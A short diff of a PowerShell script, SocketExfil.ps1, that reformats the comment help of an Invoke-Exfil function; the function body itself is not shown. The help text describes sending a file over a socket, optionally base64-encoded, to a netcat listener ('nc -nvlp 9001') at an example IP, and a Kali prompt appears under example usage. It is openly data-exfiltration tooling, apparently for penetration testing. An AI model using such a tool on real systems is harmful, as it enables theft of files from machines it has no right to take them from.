@@ -1,8 +1,8 @@
 Function Invoke-Exfil () {
-        <#
-        SYNOPSIS
+    <#
+        .SYNOPSIS
             Sends a file through a socket to be received by a listener on the target machine.
-        USAGE
+        .USAGE
                 First source the file (. .\SocketExfil.ps1)
                 
                 Plaintext:
@@ -12,7 +12,7 @@ Function Invoke-Exfil () {
                 Usage (base64-encoded):
                 Server: Invoke-Exfil -IP 10.10.10.10 -Port 9001 -Path .\test.txt -Encoded
                 Client: nc -nvlp 9001 > b64test.txt        
-        #>
+    #>
         [CmdletBinding()]
         param(
             [Parameter(Mandatory)]
@@ -55,7 +55,7 @@ Function Invoke-Exfil () {
 }
 
 
-###################################################################################
+
 # Example Usage
 
 # ┌──(kali㉿kali)-[/home/kali]
